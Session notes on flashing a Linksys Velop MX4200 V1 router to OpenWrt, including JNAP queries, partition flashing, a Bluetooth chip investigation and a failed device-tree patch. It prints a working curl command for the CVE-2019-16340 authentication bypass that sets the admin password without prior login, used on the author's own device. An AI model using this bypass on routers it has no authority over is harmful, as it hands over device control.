# Linksys Velop MX4200 V1 Session Notes

This file captures everything learned while flashing an MX4200 V1 to OpenWrt using the CVE-2019-16340 auth bypass. The MX4200 is fundamentally different from the WHW03: it requires a CVE bypass to get past the "Download the Linksys App" blocking page, runs on qualcommax/ipq807x instead of ipq40xx, and has a single ethernet port instead of two.

## Scope

- Applies to Linksys Velop MX4200 V1 only.
- V2 has different hardware: 1GB RAM, taller enclosure (~24.3cm vs ~18.5cm), model label says MX4200V2. This recipe does not cover V2.
- ISP-branded units (SPNMX42) are reportedly V2 hardware in disguise and may need debranding. Treat them as unsupported until verified.
- SoC: Qualcomm IPQ8174 (qualcommax/ipq807x). Not ipq40xx. Do not confuse the two targets.

## What Happened

### 1. Device discovery

- The unit appeared at a link-local address (169.254.218.161) with no DHCP server. LLDP identified it as `LinksysXXXXX` on `eth1`, VLAN 4.
- A factory reset (hold the button 10+ seconds) was needed to bring it back to the expected 192.168.1.1 with DHCP.
- After the reset, port 80 redirected to port 52000, which showed a "Download the Linksys App" page. No web login form, no way to set a password through the browser.

### 2. The blocking problem

- After factory reset, stock firmware serves a captive portal on port 52000 that demands the Linksys mobile app for initial setup.
- The `/fwupdate.html` endpoint exists on port 52000 but requires authentication. Without an admin password (which the mobile app is supposed to set), there is no way to upload firmware through the web UI.
- Default credentials `admin:admin` are rejected because no admin password exists yet.

### 3. JNAP fingerprinting (unauthenticated)

The JNAP API on port 80 accepts certain requests without authentication. This was the key to getting started:

```bash
curl -sk -X POST \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "X-JNAP-Action: http://cisco.com/jnap/core/GetDeviceInfo" \
  -d '{}' http://192.168.1.1/JNAP/
```

Response:

```json
{
  "result": "OK",
  "output": {
    "manufacturer": "Linksys",
    "modelNumber": "MX42",
    "hardwareVersion": "1",
    "firmwareVersion": "1.0.11.208553"
  }
}
```

Note: `modelNumber` is `MX42`, not `MX4200`. The JNAP API truncates the name. Use `MX42` with `hardwareVersion: 1` to identify this device programmatically.

### 4. Recovery pin discovery

- The device sticker has a 5-digit recovery pin (e.g., `XXXXX`) and a sticker code (e.g., `XXXXXXXXXX`).
- Both work as the `X-JNAP-Authorization` header value for read-only JNAP actions.
- Neither works for write actions. This is where the CVE bypass comes in.

### 5. CVE-2019-16340 auth bypass

The JNAP action `http://linksys.com/jnap/nodes/setup/SetAdminPassword` accepts a `resetCode` field that lets anyone set the admin password without being authenticated:

```bash
curl -sk -X POST \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "X-JNAP-Action: http://linksys.com/jnap/nodes/setup/SetAdminPassword" \
  -d '{"resetCode":"XXXXX","adminPassword":"admin"}' \
  http://192.168.1.1/JNAP/
```

After this, `admin:admin` works for all JNAP write actions and the `/fwupdate.html` page on port 52000. This is the only known way to flash this device without the Linksys mobile app.

### 6. Flashing partition 1

The firmware upload uses port 52000 over HTTP (not HTTPS, not port 443):

```bash
curl -sk --max-time 300 \
  -u "admin:admin" \
  -F "X-JNAP-Action=updatefirmware" \
  -F "X-JNAP-Authorization=Basic YWRtaW46YWRtaW4=" \
  -F "upload=@openwrt-factory.bin;type=application/octet-stream" \
  http://192.168.1.1:52000/jcgi/
```

Returns `{"result":"OK"}`. The device then reboots into OpenWrt on partition 1.

### 7. Flashing partition 2

After OpenWrt booted from partition 1, SSH was used to write the same factory image to the second partition:

```bash
scp -O openwrt-factory.bin root@192.168.1.1:/tmp/
ssh root@192.168.1.1 'mtd -r -e alt_kernel -n write /tmp/openwrt-factory.bin alt_kernel'
```

Both partitions must have OpenWrt. If only one partition is flashed and the device gets factory-reset (the 30/30/30 power-cycle trick), it will boot into the stock partition and the flash is lost.

### 8. Sysupgrade verified

Once OpenWrt is running, normal sysupgrade works as expected:

```bash
sysupgrade -n /tmp/firmware.bin
```

Exit code 246 (normal for sysupgrade). Device reboots and comes back in about 30 seconds.

## Timing

| Phase | Duration |
|-------|----------|
| Stock readiness after factory reset | 60-90 seconds before JNAP responds |
| Flash upload (14.6MB factory image) | ~30 seconds |
| OpenWrt first boot | ~60 seconds |
| Sysupgrade reboot | ~30 seconds |

Poll the device at 3-second intervals. Expect recovery within 10 attempts (30 seconds). If it does not come back after 60 attempts (3 minutes), something is wrong.

Wait for JNAP to respond before starting the flash. The network stack (ping, DHCP) comes up before the management services are ready.

## Identification

| Method | Value |
|--------|-------|
| JNAP `modelNumber` | `MX42` (truncated, not MX4200) |
| JNAP `hardwareVersion` | `1` |
| MAC OUI | `E8:9F:80` (Belkin/Linksys) |
| LLDP system name | `LinksysXXXXX` (last 5 digits of serial) |
| Ethernet ports | 1 (distinguishes from WHW03 which has 2) |
| Height (V1) | ~18.5cm |
| Height (V2) | ~24.3cm |

The single ethernet port is the quickest physical distinguisher from the WHW03.

## JNAP Auth Model

Understanding the JNAP auth model is critical for automation. There are four levels:

1. **Unauthenticated**: `GetDeviceInfo` and other core read-only actions. No headers needed.
2. **Recovery pin auth**: The 5-digit sticker pin or sticker code works for read-only actions. Pass as `X-JNAP-Authorization` header. Does not work for write actions.
3. **CVE bypass**: `SetAdminPassword` with `resetCode` sets the admin password without any prior authentication. This is CVE-2019-16340.
4. **Admin auth**: After the CVE bypass sets `admin:admin`, full access to all JNAP actions including firmware upload.

The flash script uses levels 1, 3, and 4 in sequence.

## Known Issues

- **5GHz WiFi may be broken on V1** due to wrong BDF file. GitHub issue openwrt/openwrt#14523. Workaround: remove `ipq-wifi-linksys_mx4200` package, extract calibration data directly from the `0:art` MTD partition.
- **160MHz channels NOT supported**. This is an IPQ8174 hardware limitation, not a software bug.
- **Dual partition requirement**: Both partitions must have OpenWrt. A 30/30/30 reset (power cycle 3 times) will revert to the stock partition if only one was flashed. Always flash partition 2 after partition 1 boots.
- **OpenWrt WiFi is OFF by default**. Radio interfaces exist but are disabled. Configure via LuCI or SSH after first boot.
- **Port 52000, not 443**: The firmware upload endpoint is on port 52000 over plain HTTP. Do not use HTTPS or port 443.
- **Bluetooth (EFR32MG21) not working**: The EFR32 is likely unpowered under OpenWrt. PMIC LDO11 (2.94V, zero consumers) is the probable power rail but has no DT binding to enable it. Stock firmware used proprietary userspace to manage the chip. Getting BLE under Linux requires custom EFR32 HCI firmware + SWD/JTAG for initial flash. See the Bluetooth section for full details.
- **Device 2 stuck on broken alt_kernel partition**: A failed mkimage-rebuilt FIT image was written to alt_kernel (mtd23) with `boot_part=2`. Device does not boot from it. U-Boot fallback to partition 1 (mtd21, original working OpenWrt) is not triggering automatically. Requires serial cable or physical reset procedure to recover. See "DTB Patching Attempt" section for full details.

## Critical Partitions

Back these up before flashing if you care about recovery to stock:

| Partition | Size | Contents |
|-----------|------|----------|
| `0:art` | 524KB | WiFi calibration data. Losing this means bricked 5GHz radio. |
| `appsblenv` | 524KB | Bootloader environment. |
| `devinfo` | 131KB | Device identity and serial information. |

```bash
# Backup before flashing
ssh root@192.168.1.1 'mkdir -p /tmp/mtd-backup && \
  cat /dev/mtd0ro > /tmp/mtd-backup/art.bin && \
  cat /dev/mtd$(cat /proc/mtd | grep appsblenv | cut -d: -f1 | tr -d mtd)ro > /tmp/mtd-backup/appsblenv.bin && \
  cat /dev/mtd$(cat /proc/mtd | grep devinfo | cut -d: -f1 | tr -d mtd)ro > /tmp/mtd-backup/devinfo.bin'
scp -O root@192.168.1.1:/tmp/mtd-backup/*.bin ./mx4200-mtd-backup/
```

## Practical Next-Session Checklist

1. Factory reset the device and wait for stock readiness (60-90 seconds).
2. Verify JNAP responds with `GetDeviceInfo` showing `MX42` and `hardwareVersion: 1`.
3. Use the CVE bypass to set the admin password with the recovery pin.
4. Verify `admin:admin` works on port 52000 `/fwupdate.html`.
5. Upload the factory image to port 52000 `/jcgi/`.
6. Wait for OpenWrt to boot (~60 seconds, poll every 3 seconds).
7. SSH in and flash the second partition via `mtd write` to `alt_kernel`.
8. Run `sysupgrade -n` if a newer build is needed.
9. Back up `0:art`, `appsblenv`, and `devinfo` partitions before anything else.
10. Configure WiFi radios (disabled by default) and network settings.

## Bluetooth (Silicon Labs EFR32MG21) — Deep Investigation

The MX4200 contains a **Silicon Labs EFR32MG21 Series 2** multiprotocol wireless SoC (BLE 5 + Zigbee + Thread), NOT a Qualcomm WCNSS chip. It is located in a Faraday cage in the upper-left corner of the PCB (confirmed by EDN teardown and FCC ID K7S-03580 internal photos).

**Status: NOT WORKING under OpenWrt. Root cause identified: EFR32 is likely unpowered.**

### Hardware Wiring (Confirmed via device tree + live probing)

| Signal | IPQ8174 | EFR32MG21 | Notes |
|--------|---------|-----------|-------|
| UART TX | GPIO46 (blsp2_uart) | PA0/PA1 (RX) | ttyMSM1, 19.2MHz UART clock |
| UART RX | GPIO47 (blsp2_uart) | PA0/PA1 (TX) | MMIO 0x78b1000 |
| UART CTS | GPIO48 (blsp2_uart) | — | Flow control |
| UART RTS | GPIO49 (blsp2_uart) | — | Flow control |
| RESETn | GPIO21 | nRESET | Active-LOW. DT: out, bias-pull-up |
| BOOT/RECV | GPIO22 | BOOT mode | DT: input. LOW=normal, HIGH=recovery |

UART aliases: `serial0` = blsp1_uart5 (console on ttyMSM0), `serial1` = blsp1_uart3 (EFR32 on ttyMSM1).

### Power Supply — Root Cause of Silence

**The EFR32 is completely silent on UART at all baud rates (9600–921600).**

After exhaustive probing (reset toggling, recovery pin cycling, ASH/BGAPI/XMODEM commands, multiple baud rates), zero meaningful bytes were received. The `0xF8 0x00` patterns seen are UART line noise from opening/closing the serial port, not EFR32 data.

**Most likely cause: PMIC LDO11 (l11) is not enabled.**

| Regulator | Voltage | Users | Always-on | EFR32 candidate? |
|-----------|---------|-------|-----------|-------------------|
| vdd_s3 | 696mV | 2 | yes | No (too low) |
| vdd_s4 | 864mV | 1 | yes | No (too low) |
| **l11** | **2944mV** | **0** | **no** | **Yes — 2.94V is within EFR32 range (1.71–3.8V)** |

L11 is the only PMIC regulator in the correct voltage range for the EFR32MG21 (VDD: 1.71–3.8V, typical 3.3V). It has **zero consumers** and is **not marked always-on or boot-on**. The stock firmware's proprietary userspace likely enabled this regulator during boot.

Evidence chain:
1. Stock kernel `CONFIG_BT is not set` — no kernel Bluetooth at all in stock firmware
2. Stock firmware used **proprietary userspace library** for EFR32 management (not in GPL source)
3. Linksys GPL source (`MX4200_v1.0.13.216602.tgz`) contains only standard open source components — no Linksys-specific EFR32 init code, no firmware blobs, no device tree overrides
4. The `syscfg` UBI partition contains stock config files but **no EFR32 firmware blobs**
5. Security advisory SYSS-2025-002 confirms the stock firmware runs a custom BLE GATT server (Service UUID `00002080-8eab-46c2-b788-0e9440016fd1`) for mesh pairing

### Device Tree Configuration (OpenWrt)

From `target/linux/qualcommax/dts/ipq8174-mx4200.dtsi`:
```dts
&blsp1_uart3 {
    status = "okay";
    pinctrl-0 = <&hsuart_pins &iot_pins>;
    pinctrl-names = "default";
    /* Silicon Labs EFR32MG21 IoT */
};

&tlmm {
    iot_pins: iot-state {
        recovery-pins {
            pins = "gpio22";
            function = "gpio";
            input;
        };
        reset-pins {
            pins = "gpio21";
            function = "gpio";
            bias-pull-up;
        };
    };
};
```

**Critically missing from the DT:**
- No `bluetooth {}` child node under the UART
- No power-supply or regulator reference (no `vdd-supply = <&l11>`)
- No firmware-name property
- No compatible string for an EFR32 driver

### Stock Firmware BLE Behavior (from SYSS-2025-002)

The stock EFR32 firmware implements a proprietary BLE mesh pairing service:
- Advertising: Flags `0x06`, Manufacturer data `0x5C00 0x0000`, Service UUID `00002080-...`
- Local name: "Linksys"
- Activated by pressing reset button 5 times quickly
- Used to transfer WiFi credentials (encrypted) to new mesh nodes

This confirms the EFR32 runs a **complete BLE stack with custom GATT server** — not standard HCI. Even if powered, it would NOT respond to HCI UART commands.

### EFR32MG21 Boot Architecture (from Silicon Labs docs)

- **Secure Engine in ROM**: Factory pre-programmed, validates boot chain
- **Main Gecko Bootloader**: Must be flashed via SWD/JTAG initially (NOT factory pre-programmed on Series 2)
- **Application firmware**: Runs from internal flash (512KB or 768KB variant)
- **NO ROM UART bootloader**: If the bootloader is corrupted, recovery requires SWD/JTAG only
- **UART DFU**: Possible AFTER bootloader is present. Uses XMODEM-CRC or BGAPI protocol
- **Autobaud**: Send 'U' character, bootloader detects baud rate and syncs
- **Reset pin**: Active-LOW (RESETn). Can be held indefinitely without damage (107µA consumption)
- **Bootloader entry**: Via GPIO activation (configurable pin), software reset, or failed app verification

### GPL Source Analysis

Downloaded `MX4200_v1.0.13.216602.tgz` (466MB) from `https://downloads.linksys.com/support/assets/gpl/`.

Contains: Linux 4.4.60 kernel with QSDK SPF11.3 BSP patch (815K lines), standard open source packages (busybox, dnsmasq, iptables, etc.).

**Does NOT contain:**
- Any Linksys-specific EFR32 initialization code
- Any EFR32 firmware blobs
- Any MX4200-specific device tree (the DTS in the patch is for a generic QSDK reference board)
- Any proprietary Linksys userspace daemons
- Any Bluetooth-related userspace tools or libraries

The BSP patch has `hci_qca.c` (Qualcomm BT driver) but it is for QCA6174/WCN series chips, not EFR32. The `CONFIG_BT is not set` in the shipped kernel config confirms Bluetooth is entirely userspace in the stock firmware.

### Path to Getting Bluetooth Working

**Step 1: Enable L11 regulator** — Most critical. Without power, nothing else matters.
- Try writing to regulator sysfs to enable L11
- If that fails, build a device tree overlay adding `vdd-supply = <&l11>` to the serial node
- Verify EFR32 responds on UART after power-up

**Step 2: If EFR32 responds** — Identify what firmware it's running.
- Capture boot output after reset release
- Try ASH RST frame (`0x1A 0xC0 0x38 0xBC 0x7E`) for EZSP/Zigbee NCP detection
- Try BGAPI system hello for BLE NCP detection
- Try sending 'U' at 115200 for Gecko Bootloader autobaud

**Step 3: Flash custom HCI firmware** — Even if stock firmware responds, it runs Linksys' proprietary BLE GATT server, not standard HCI. To get Linux Bluetooth:
- Need custom EFR32MG21 Bluetooth HCI UART firmware built with Silicon Labs Gecko SDK
- Initial flash requires SWD/JTAG access (no pre-built HCI firmware images exist anywhere)
- Subsequent updates possible via UART DFU (XMODEM or BGAPI)
- The darkxst/silabs-firmware-builder has Zigbee NCP and OpenThread RCP firmware only — NO Bluetooth HCI firmware
- Silicon Labs CPC (cpcd + bt_host_cpc_hci_bridge) exists but requires multiprotocol RCP firmware and is unstable

**Recovery risk**: If Secure Boot is enabled on the EFR32 (likely for a production device), custom firmware won't boot. SWD/JTAG access would be needed to check and potentially disable Secure Boot.

### Practical Workaround

USB Bluetooth dongle. The xHCI controller and btusb driver are already loaded:
```bash
opkg update
opkg install kmod-btusb bluez-libs bluez-utils bluez-daemon
/etc/init.d/bluetooth start
hciconfig -a
```
This gives full Bluetooth Classic + BLE + L2CAP support via an external dongle.

## Lessons Learned (Device 2 Session)

- **Recovery pin IS required** — the CVE bypass returned `ErrorInvalidResetCode` with empty or missing resetCode. The 5-digit pin from the device sticker is mandatory.
- **Port 52000 may not be available** — on device 2, port 52000 never came up. Port 80 `/jcgi/` worked instead for the firmware upload. Try port 80 first.
- **Firmware upload works on port 80** — `curl -u admin:admin http://192.168.1.1/jcgi/` (not just port 52000)
- **Device 2 was not factory-reset** — it appeared on 192.168.1.1 with JNAP responding immediately, but admin:admin was rejected until the CVE bypass was applied
- **Both devices identical hardware** — same firmware version (1.0.11.208553), same SoC, same partition layout, same MAC OUI (E8:9F:80)

## DTB Patching Attempt — L11 Regulator Enable (Boot Failure)

### Goal

Enable the PMIC LDO11 (l11) regulator that likely powers the EFR32MG21 Bluetooth SoC. The regulator has `num_users=0` and is not `always-on` under OpenWrt because the stock firmware's proprietary userspace enabled it. The only way to enable it is to patch the Device Tree Blob (DTB) embedded in the kernel FIT image.

### Approach: FIT Image DTB Injection

The MX4200 kernel partition contains a FIT (Flattened Image Tree) image — a U-Boot standard container format. The FIT image embeds:
1. A gzip-compressed Linux kernel (~5MB)
2. A flattened device tree blob (DTB, ~45KB)
3. Hash checksums for both

The plan was to:
1. Extract the DTB from the FIT image
2. Patch the l11 node to add `regulator-always-on; regulator-boot-on;`
3. Re-inject the patched DTB back into the FIT image
4. Write the modified FIT to the alternate kernel partition (alt_kernel, mtd23)
5. Set `boot_part=2` in U-Boot env and reboot

This approach keeps the original working kernel on partition 1 (mtd21) as a fallback — if the patched image fails, switching back should be as simple as `fw_setenv boot_part 1`.

### What Went Wrong — Three Attempts

#### Attempt 1: Raw Binary Injection (Partial Success)

**Method**: Found the embedded DTB by scanning for the second `0xd00dfeed` FDT magic in the FIT image (at offset 0x4E49EC). Replaced the DTB bytes in-place, updated the FIT header's `totalsize` field, and updated a `data-size` property found near the DTB offset.

**Result**: The device **booted successfully** from the patched FIT image. However, the l11 regulator still showed `num_users=0` and `regulator-always-on` was **missing** from the live device tree.

**Root cause**: The FDT (Flattened Device Tree) format stores property values with explicit length fields. When the patched DTB was 24 bytes larger than the original (45823 vs 45799 bytes), the FIT image's FDT structure still had the old property length (45799). U-Boot's FIT parser read only 45799 bytes from the `data` property, truncating the last 24 bytes — exactly where `regulator-always-on` and `regulator-boot-on` were located (they were appended at the end of the DTB structure block by `dtc` compilation).

The kernel log confirmed this: `l11: disabling` — the kernel saw l11 without always-on/boot-on properties and disabled the unused regulator.

#### Attempt 2: mkimage Rebuild (Boot Failure)

**Method**: Extracted the kernel and DTB from the original FIT using `dumpimage`. Created a new ITS (Image Tree Source) file and rebuilt the FIT image from scratch using `mkimage -f its_file output.img`.

**Result**: The device **failed to boot**. SSH never became reachable. No fallback to partition 1 occurred.

**Root cause**: The `mkimage`-rebuilt FIT image had a different internal FDT structure than the original. While `mkimage -l` showed correct metadata and `dumpimage` could extract the components, U-Boot on this device either:
- Expects a specific FIT layout/format that differs from what the host's `mkimage` produces (version differences, alignment padding, or OpenWrt-specific build flags)
- Has signature/hash verification that rejects the rebuilt image (the original hash values were preserved in the ITS but don't match the new DTB)

The rebuilt FIT was 488 bytes smaller than the original (5177396 vs 5177884) despite having a 24-byte larger DTB, suggesting structural differences in the FDT organization.

#### Attempt 3: Proper FDT Binary Patch (Prepared, Not Deployed)

**Method**: Took the original FIT image and performed surgical FDT-level patching in Python:
1. Located the `FDT_PROP` token (0x00000003) for the `data` property of `fdt@1` at offset 0x4E4A08
2. Updated the property's length field from 45799 to 45823
3. Replaced the DTB data bytes in-place
4. Updated ALL FDT header fields: `totalsize`, `off_dt_strings`, and critically `size_dt_struct`

**Result**: `mkimage -l` validates the image. `dumpimage` extracts the DTB and confirms `regulator-always-on` and `regulator-boot-on` are present. **Not yet deployed** — device is stuck on partition 2 with the broken mkimage-rebuilt image.

### Why the Recovery/Fallback Is Not Working

The Linksys MX4200 has a dual-partition layout with `boot_part` U-Boot env variable controlling which partition to boot from. The expected fallback mechanism:

1. U-Boot reads `boot_part=2` and attempts to boot the FIT image on alt_kernel
2. If the kernel fails to start, U-Boot should increment a `bootcount` variable
3. After `bootcount > bootlimit` (typically 3), U-Boot should switch to `boot_part=1`
4. The original working kernel on partition 1 boots successfully

**Why this isn't happening**:

1. **No serial cable**: Without serial console access, we cannot observe U-Boot's behavior, interrupt the boot sequence, or manually change environment variables. We're flying blind.

2. **U-Boot boot counter may not be configured**: The OpenWrt port for MX4200 may not have `bootlimit` set in the default U-Boot environment. Without this, U-Boot will retry partition 2 indefinitely on every power cycle, never falling back to partition 1.

3. **The `linksys_bootcount` OpenWrt package** manages boot counting from the Linux side — it increments `bootcount` early in boot and resets it after successful startup. But this only works if Linux actually boots. If the kernel never starts (bad FIT image), the package never runs, and the counter never increments.

4. **U-Boot's own boot retry logic** depends on the board-specific U-Boot build. Some Linksys devices have a hardware watchdog that triggers a reboot after a failed boot, which would increment a hardware boot counter. But this is board-specific and may not be present on the MX4200 OpenWrt port.

5. **The bad FIT image may not trigger a clean failure**: If U-Boot can parse the FIT header but the kernel panics early (before setting up the watchdog or serial console), the device may hang indefinitely rather than rebooting. A clean U-Boot rejection (bad magic, bad checksum) would trigger immediate fallback, but a kernel panic might not.

### Recovery Options Without Serial Cable

1. **Power cycle repeatedly (3-5 times in quick succession)**: The "30/30/30 reset" trick that works on some Linksys devices. Hold reset for 30 seconds, unplug power while holding, wait 30 seconds, plug back in while holding, release after 30 seconds. This may trigger U-Boot's factory reset which resets `boot_part` to the default.

2. **TFTP boot interrupt**: If the MX4200 U-Boot has a network TFTP recovery mode (common on IPQ807x devices), it may listen for TFTP on a specific IP after repeated failed boots. Check if the device appears on a different IP (e.g., 192.168.1.1 or a vendor-specific recovery IP) after power cycling.

3. **Open the case and add a serial header**: The MX4200 PCB likely has unpopulated serial header pads. Adding a 3.3V USB-serial adapter would give console access to U-Boot, allowing manual `setenv boot_part 1; saveenv; boot` commands. This is the most reliable recovery method.

4. **Wait for U-Boot timeout**: Some U-Boot builds have a boot retry mechanism where after N failed attempts (with power cycles between each), it falls back to a default boot configuration. Try power cycling 5-10 times with 30-second intervals.

5. **NAND swap**: If truly desperate, the NAND flash chip could be removed and reprogrammed externally. This requires specialized equipment and skills.

### Key Lesson: Never Write to Both Partitions Without Serial

The cardinal rule for dual-partition devices without serial access: **always keep one partition as a known-good fallback**. In this case, partition 1 (mtd21) still has the original working OpenWrt kernel — the problem is that U-Boot can't be told to switch back without either:
- Serial console access
- A working `bootcount`/`bootlimit` mechanism
- A physical reset procedure that resets U-Boot env

The safer approach would have been to:
1. Build a complete OpenWrt image using the Image Builder with a DTS patch (not FIT injection)
2. Flash via `sysupgrade` (which updates the CURRENT partition and preserves the alt partition)
3. Or use `mtd write` to the CURRENTLY INACTIVE partition and `fw_setenv boot_part` to test, with a known-good fallback mechanism verified beforehand

### Files Generated During This Session

| File | Purpose |
|------|---------|
| `/tmp/fit-original.img` | Dump of original FIT from mtd21 (5177884 bytes) |
| `/tmp/fit-dtb-extracted.dtb` | DTB extracted from original FIT (45799 bytes, unpatched) |
| `/tmp/fit-dtb-extracted.dts` | Decompiled DTS with l11 always-on/boot-on patch |
| `/tmp/fit-dtb-patched.dtb` | Recompiled patched DTB (45823 bytes) |
| `/tmp/fit-patched.img` | Attempt 1: Raw binary injection (boots but truncates DTB) |
| `/tmp/fit-rebuild/fit-patched.img` | Attempt 2: mkimage rebuild (fails to boot) |
| `/tmp/fit-properly-patched.img` | Attempt 3: Proper FDT-level patch (validated, not deployed) |
| `/tmp/mx4200.dtb` | Live DTB extracted from device (49152 bytes, includes runtime additions) |
| `/tmp/mx4200.dts` | Decompiled live DTS with l11 patch |
| `/tmp/mx4200-patched.dtb` | Patched live DTB (46311 bytes) |

### FIT Image Structure Reference

```
Offset      Size       Content
0x000000    0x38       FDT header (magic=0xd00dfeed, totalsize, offsets)
0x000038    varies     FDT structure block (nodes, properties, data blobs)
  ...
  0x4E4A08  12         FDT_PROP entry for fdt@1 "data" (token + length + nameoff)
  0x4E4A14  45799      DTB binary data (the actual device tree)
  ...
0x4EF2C0    108        Strings block (property name strings)
Total: 5177884 bytes
```

Key header fields:
- `totalsize` (offset 4): Total FDT blob size
- `off_dt_struct` (offset 8): Offset to structure block (= 56 = 0x38)
- `off_dt_strings` (offset 12): Offset to strings block
- `size_dt_strings` (offset 32): Size of strings block
- `size_dt_struct` (offset 36): Size of structure block

When patching, ALL of `totalsize`, `off_dt_strings`, and `size_dt_struct` must be updated by the size difference.

## References

### Flashing
- OpenWrt Wiki: https://openwrt.org/toh/linksys/mx4200_v1
- CVE-2019-16340: https://nvd.nist.gov/vuln/detail/CVE-2019-16340
- 5GHz BDF issue: https://github.com/openwrt/openwrt/issues/14523
- MX4200 OpenWrt support PR: https://github.com/openwrt/openwrt/pull/13432

### Hardware & Teardown
- FCC ID K7S-03580: https://fcc.report/FCC-ID/K7S-03580 (internal photos, BT-LE test report)
- EDN Teardown: https://www.edn.com/the-linksys-mx4200c-a-retailer-branded-router-with-memory-deficiencies/
- WikiDevi: https://wikidevi.wi-cat.ru/Linksys_MX4200
- TechInfoDepot: https://techinfodepot.shoutwiki.com/wiki/Linksys_MX4200
- PCB ID: 48SAQB11.0GA, Manufacturer: Wistron NeWeb

### EFR32MG21 Silicon Labs
- Datasheet: https://www.silabs.com/wireless/zigbee/efr32mg21-series-2-socs
- Gecko Bootloader User's Guide (GSDK 4+): UG489
- UART Bootloader App Note: AN0042
- Gecko Bootloader Lab: https://www.silabs.com/documents/public/training/mcu/gecko-bootloader-lab.pdf
- CPC Multiprotocol Solution: https://docs.silabs.com/bluetooth/9.1.1/multiprotocol-solution-linux/

### EFR32 Community Firmware
- darkxst/silabs-firmware-builder: https://github.com/darkxst/silabs-firmware-builder (Zigbee NCP + OpenThread RCP only, NO Bluetooth HCI)
- Issue #192 (MX4200 EFR32 use case): https://github.com/darkxst/silabs-firmware-builder/issues/192

### Linksys GPL Source
- GPL Code Center: https://support.linksys.com/kb/article/316-en/
- MX4200 V1 GPL: https://downloads.linksys.com/support/assets/gpl/MX4200_v1.0.13.216602.tgz (466MB, kernel 4.4.60 + QSDK SPF11.3)
- MX4200 V2 GPL: https://downloads.linksys.com/support/assets/gpl/MX4200_v2.0.7.216620.tgz

### Security & BLE Protocol
- SYSS-2025-002 (BLE mesh pairing vulnerability): https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2025-002.txt
- Full disclosure: https://seclists.org/fulldisclosure/2026/Feb/11
- BLE Service UUID: 00002080-8eab-46c2-b788-0e9440016fd1

### OpenWrt DTS Source Files
- Board DTS: target/linux/qualcommax/dts/ipq8174-mx4200v1.dts
- Board DTSI: target/linux/qualcommax/dts/ipq8174-mx4200.dtsi (EFR32 UART + iot_pins)
- Shared DTSI: target/linux/qualcommax/dts/ipq8174-mx4x00.dtsi (aliases, keys, LEDs)
